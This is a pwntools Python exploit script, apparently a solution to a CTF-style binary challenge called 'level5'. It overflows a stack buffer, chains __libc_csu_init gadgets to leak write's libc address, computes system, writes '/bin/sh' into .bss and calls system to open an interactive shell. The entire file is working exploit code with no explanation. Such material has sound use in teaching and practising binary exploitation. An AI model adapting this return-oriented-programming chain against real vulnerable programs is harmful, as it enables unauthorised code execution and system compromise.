#!python
#!/usr/bin/env python
from pwn import *

elf = ELF('level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./level5')
got_write = elf.got['write']
got_read = elf.got['read']
main = 0x400564
off_system_addr = libc.symbols['write'] - libc.symbols['system']

payload1 =  b"\x00"*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += b"\x00"*56
payload1 += p64(main)
p.recvuntil(b"Hello, World\n")
p.send(payload1)
sleep(1)
write_addr = u64(p.recv(8))
system_addr = write_addr - off_system_addr

bss_addr=0x601028
p.recvuntil(b"Hello, World\n")
#rdi=  edi = r13,  rsi = r14, rdx = r15 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  b"\x00"*136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += b"\x00"*56
payload2 += p64(main)
p.send(payload2)
sleep(1)

p.send(p64(system_addr))
p.send(b"/bin/sh\0")
sleep(1)

p.recvuntil(b"Hello, World\n")
#rdi=  edi = r13,  rsi = r14, rdx = r15 
#system(rdi = bss_addr+8 = "/bin/sh")
payload3 =  b"\x00"*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += b"\x00"*56
payload3 += p64(main)
sleep(1)
p.send(payload3)

p.interactive()